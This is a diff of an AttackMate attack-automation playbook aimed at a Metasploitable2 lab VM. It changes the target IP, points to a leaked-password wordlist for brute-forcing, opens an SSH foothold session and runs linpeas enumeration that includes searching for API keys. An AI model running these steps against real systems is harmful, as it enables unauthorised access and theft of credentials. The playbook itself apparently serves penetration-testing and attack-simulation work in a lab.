@@ -1,5 +1,5 @@
 #
-# Author: Wolfgang Hotwagner
+# Author: Wolfgang Hotwagner, Erik Grafendorfer
 # Description:
 #     This playbook perfoms the following attack-steps:
 #     1. scan the metasploitable-vm
@@ -16,8 +16,8 @@
 #     4. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+  METASPLOITABLE: 192.168.0.146
+  PASSWDLIST: /snap/seclists/current/Passwords/Common-Credentials/darkweb2017_top-1000.txt
 
 commands:
   - type: shell
@@ -43,6 +43,7 @@ commands:
     username: user
     password: "$USERPW"
     hostname: $METASPLOITABLE
+    interactive: False
     creates_session: "foothold"
 
   # create a local tempfile for linpeas
@@ -68,8 +69,10 @@ commands:
   # is set to 0 because linpeas runs very long without any
   # output. AttackMate will run until the output of the commands
   # ends with a prompt.
+
   - type: ssh
-    cmd: "bash /tmp/linpeas.sh\n"
+    cmd: "/tmp/linpeas.sh -s -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,software_information,interesting_perms_files,interesting_files,api_keys_regex \n"
+    session: "foothold"
     save: /tmp/linpeas_output.txt
     exit_on_error: False
     interactive: True
